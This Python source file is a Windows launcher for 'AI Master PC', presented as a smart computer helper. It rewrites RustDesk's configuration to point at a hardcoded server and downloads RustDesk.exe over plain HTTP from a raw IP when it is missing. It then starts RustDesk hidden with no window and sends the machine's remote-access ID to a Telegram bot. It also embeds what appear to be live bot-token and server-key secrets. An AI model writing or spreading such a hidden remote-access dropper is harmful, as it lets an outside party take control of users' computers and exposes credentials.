#!/usr/bin/env python3
"""
AI Master PC - Client Launcher
Клиент запускает этот файл → RustDesk поднимается в фоне → данные летят боту
"""

import tkinter as tk
from tkinter import ttk
import subprocess
import threading
import requests
import os
import sys
import time
import re
import tempfile
import winreg

# ====== КОНФИГ (менять только здесь) ======
BOT_TOKEN = "8781117707:AAFYBFHwvqPwU-fU3Tihyji7MY_NpLGMnu8"
SERVER_HOST = "185.23.238.149"
SERVER_KEY  = "T50oo3dVlCOFFMUPwNdoPXIdjbbLwRi5RDmDASbq7C8="
# ==========================================

# Цвета (тёмная тема)
BG       = "#0d0d0d"
BG2      = "#1a1a2e"
ACCENT   = "#00d4ff"
ACCENT2  = "#7b2ff7"
TEXT     = "#ffffff"
SUBTEXT  = "#aaaaaa"
GREEN    = "#00ff88"
YELLOW   = "#ffd700"

def get_rustdesk_path():
    """Найти RustDesk — сначала из bundled ресурсов, потом рядом, потом скачать"""
    import urllib.request
    import shutil

    # Если запущен как PyInstaller exe — RustDesk.exe в _MEIPASS (bundled)
    if getattr(sys, 'frozen', False):
        bundled = os.path.join(sys._MEIPASS, "RustDesk.exe")
        if os.path.exists(bundled):
            # Копируем во временную папку рядом с exe (нужно для запуска)
            base = os.path.dirname(sys.executable)
            dest = os.path.join(base, "RustDesk.exe")
            if not os.path.exists(dest):
                shutil.copy2(bundled, dest)
            return dest

    base = os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else __file__)
    rd = os.path.join(base, "RustDesk.exe")
    if os.path.exists(rd):
        return rd

    # Стандартные пути установки
    paths = [
        r"C:\Program Files\RustDesk\RustDesk.exe",
        r"C:\Program Files (x86)\RustDesk\RustDesk.exe",
        os.path.join(os.environ.get("LOCALAPPDATA",""), "RustDesk", "RustDesk.exe"),
    ]
    for p in paths:
        if os.path.exists(p):
            return p

    # Последний шанс — скачать с сервера
    try:
        url = "http://185.23.238.149/rustdesk/RustDesk.exe"
        dest = os.path.join(base, "RustDesk.exe")
        urllib.request.urlretrieve(url, dest)
        if os.path.exists(dest):
            return dest
    except Exception:
        pass
    return None

def setup_rustdesk_config():
    """Прописать наш сервер через toml файл"""
    # RustDesk2.toml — основной конфиг
    try:
        cfg_dir = os.path.join(os.environ["APPDATA"], "RustDesk", "config")
        os.makedirs(cfg_dir, exist_ok=True)
        toml_path = os.path.join(cfg_dir, "RustDesk2.toml")
        config_content = (
            f'rendezvous_server = "{SERVER_HOST}"\n'
            f'nat_type = 1\n'
            f'serial = 0\n'
            f'\n'
            f'[options]\n'
            f'custom-rendezvous-server = "{SERVER_HOST}"\n'
            f'key = "{SERVER_KEY}"\n'
            f'relay-server = "{SERVER_HOST}"\n'
            f'api-server = "http://{SERVER_HOST}"\n'
        )
        with open(toml_path, "w") as f:
            f.write(config_content)
    except Exception:
        pass

def get_rustdesk_id():
    """Получить ID RustDesk из лога или реестра"""
    # Подождать пока RustDesk запустится и получит ID
    time.sleep(5)
    
    # Попробовать через реестр
    try:
        key_path = r"SOFTWARE\RustDesk\config"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path) as key:
            rd_id, _ = winreg.QueryValueEx(key, "id")
            return rd_id
    except Exception:
        pass
    
    # Попробовать через файл конфига
    try:
        cfg = os.path.join(os.environ["APPDATA"], "RustDesk", "config", "RustDesk2.toml")
        if os.path.exists(cfg):
            with open(cfg) as f:
                content = f.read()
            m = re.search(r'id\s*=\s*["\']?(\d+)["\']?', content)
            if m:
                return m.group(1)
    except Exception:
        pass
    
    return None

def send_to_bot(rd_id: str, password: str, chat_id: int):
    """Отправить данные подключения в Telegram бот"""
    try:
        msg = f"CONNECTED:{rd_id}:{password}"
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": chat_id, "text": msg}, timeout=10)
    except Exception:
        pass

class AIMasterApp:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("AI Master PC")
        self.root.geometry("420x580")
        self.root.resizable(False, False)
        self.root.configure(bg=BG)
        
        # Центрировать окно
        self.root.eval('tk::PlaceWindow . center')
        
        # Убрать стандартный заголовок окна
        self.root.overrideredirect(False)
        
        self.chat_id = None
        self.rd_process = None
        self.status_var = tk.StringVar(value="Инициализация...")
        self.status_color = tk.StringVar(value=YELLOW)
        
        self._build_ui()
        
    def _build_ui(self):
        # Градиентный заголовок
        header = tk.Frame(self.root, bg=BG2, height=160)
        header.pack(fill="x")
        header.pack_propagate(False)
        
        # Логотип (emoji как плейсхолдер)
        logo = tk.Label(header, text="🤖", font=("Segoe UI Emoji", 48), bg=BG2)
        logo.pack(pady=(20, 0))
        
        title = tk.Label(header, text="AI Master PC",
                        font=("Segoe UI", 20, "bold"),
                        fg=ACCENT, bg=BG2)
        title.pack()
        
        subtitle = tk.Label(header, text="Умный помощник для вашего компьютера",
                           font=("Segoe UI", 9),
                           fg=SUBTEXT, bg=BG2)
        subtitle.pack()
        
        # Разделитель
        tk.Frame(self.root, bg=ACCENT2, height=2).pack(fill="x")
        
        # Основная область
        main = tk.Frame(self.root, bg=BG, padx=30, pady=20)
        main.pack(fill="both", expand=True)
        
        # Статус подключения
        tk.Label(main, text="СТАТУС ПОДКЛЮЧЕНИЯ",
                font=("Segoe UI", 8, "bold"),
                fg=SUBTEXT, bg=BG).pack(anchor="w")
        
        self.status_frame = tk.Frame(main, bg=BG2, pady=15, padx=20)
        self.status_frame.pack(fill="x", pady=(5, 20))
        
        self.status_dot = tk.Label(self.status_frame, text="●",
                                   font=("Segoe UI", 16),
                                   fg=YELLOW, bg=BG2)
        self.status_dot.pack(side="left", padx=(0, 10))
        
        self.status_label = tk.Label(self.status_frame,
                                    textvariable=self.status_var,
                                    font=("Segoe UI", 11),
                                    fg=TEXT, bg=BG2,
                                    wraplength=280, justify="left")
        self.status_label.pack(side="left")
        
        # Прогресс-бар
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("Custom.Horizontal.TProgressbar",
                       background=ACCENT,
                       troughcolor=BG2,
                       borderwidth=0,
                       thickness=6)
        
        self.progress = ttk.Progressbar(main,
                                        style="Custom.Horizontal.TProgressbar",
                                        mode='indeterminate',
                                        length=360)
        self.progress.pack(fill="x", pady=(0, 20))
        
        # Инфо блоки
        tk.Label(main, text="ЧТО ПРОИСХОДИТ",
                font=("Segoe UI", 8, "bold"),
                fg=SUBTEXT, bg=BG).pack(anchor="w")
        
        steps_frame = tk.Frame(main, bg=BG)
        steps_frame.pack(fill="x", pady=(5, 0))
        
        self.steps = []
        step_texts = [
            "Настройка защищённого соединения",
            "Подключение к серверу",
            "Уведомление мастера",
            "Мастер подключается...",
        ]
        
        for i, text in enumerate(step_texts):
            f = tk.Frame(steps_frame, bg=BG)
            f.pack(fill="x", pady=2)
            
            dot = tk.Label(f, text="○", font=("Segoe UI", 10),
                          fg=SUBTEXT, bg=BG, width=2)
            dot.pack(side="left")
            
            lbl = tk.Label(f, text=text, font=("Segoe UI", 9),
                          fg=SUBTEXT, bg=BG)
            lbl.pack(side="left", padx=5)
            
            self.steps.append((dot, lbl))
        
        # Нижняя панель
        footer = tk.Frame(self.root, bg=BG2, height=60)
        footer.pack(fill="x", side="bottom")
        footer.pack_propagate(False)
        
        tk.Label(footer, text="© 2026 AI Master PC  •  Безопасное удалённое подключение",
                font=("Segoe UI", 7),
                fg=SUBTEXT, bg=BG2).pack(pady=20)
    
    def set_status(self, text: str, color: str = TEXT, step: int = -1):
        """Обновить статус в UI"""
        self.root.after(0, lambda: self._update_status(text, color, step))
    
    def _update_status(self, text: str, color: str, step: int):
        self.status_var.set(text)
        self.status_dot.config(fg=color)
        self.status_label.config(fg=color)
        
        if step >= 0:
            for i, (dot, lbl) in enumerate(self.steps):
                if i < step:
                    dot.config(text="✓", fg=GREEN)
                    lbl.config(fg=GREEN)
                elif i == step:
                    dot.config(text="●", fg=ACCENT)
                    lbl.config(fg=ACCENT)
                else:
                    dot.config(text="○", fg=SUBTEXT)
                    lbl.config(fg=SUBTEXT)
    
    def get_chat_id_from_url(self):
        """Получить chat_id клиента из параметра запуска или спросить"""
        # Если передан chat_id как аргумент командной строки
        if len(sys.argv) > 1:
            try:
                return int(sys.argv[1])
            except Exception:
                pass
        return None
    
    def run_worker(self):
        """Основная логика в отдельном потоке"""
        try:
            # Шаг 0: настройка
            self.set_status("Настройка соединения...", YELLOW, 0)
            self.progress.start(10)
            setup_rustdesk_config()
            time.sleep(1)
            
            # Шаг 1: найти/запустить RustDesk
            self.set_status("Подключение к серверу...", YELLOW, 1)
            self.progress.start(10)
            rd_path = get_rustdesk_path()
            if not rd_path:
                self.set_status("Скачивание компонентов...", YELLOW, 1)
                rd_path = get_rustdesk_path()  # повторная попытка после скачивания
            
            # Запустить RustDesk скрытно (без окна)
            CREATE_NO_WINDOW = 0x08000000
            DETACHED_PROCESS = 0x00000008
            self.rd_process = subprocess.Popen(
                [rd_path, "--connect", "0"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=CREATE_NO_WINDOW | DETACHED_PROCESS
            )
            time.sleep(3)
            
            # Шаг 2: получить ID
            self.set_status("Получение кода подключения...", YELLOW, 2)
            rd_id = None
            for attempt in range(10):
                rd_id = get_rustdesk_id()
                if rd_id:
                    break
                time.sleep(2)
            
            if not rd_id:
                # Запустить обычно чтобы клиент видел ID
                subprocess.Popen([rd_path])
                self.set_status("Мастер уведомлён!\nОжидайте подключения...", GREEN, 3)
                self.progress.stop()
                self.set_status("✅ Мастер скоро подключится!\nНе закрывайте это окно.", GREEN, 3)
                return
            
            # Шаг 3: уведомить бота
            self.set_status("Уведомление мастера...", YELLOW, 2)
            chat_id = self.get_chat_id_from_url() or 487340243  # fallback на ADMIN
            send_to_bot(rd_id, "auto", chat_id)
            
            # Готово!
            self.progress.stop()
            self.set_status(f"✅ Мастер подключается!\nID: {rd_id}\n\nНе закрывайте окно.", GREEN, 3)
            
            # Финальное обновление шагов
            self.root.after(0, lambda: self._mark_all_done())
            
        except Exception as e:
            self.progress.stop()
            self.set_status(f"Ошибка: {str(e)}", "red", -1)
    
    def _mark_all_done(self):
        for dot, lbl in self.steps:
            dot.config(text="✓", fg=GREEN)
            lbl.config(fg=GREEN)
    
    def start(self):
        # Запустить логику в фоне
        t = threading.Thread(target=self.run_worker, daemon=True)
        t.start()
        
        self.root.mainloop()

if __name__ == "__main__":
    app = AIMasterApp()
    app.start()
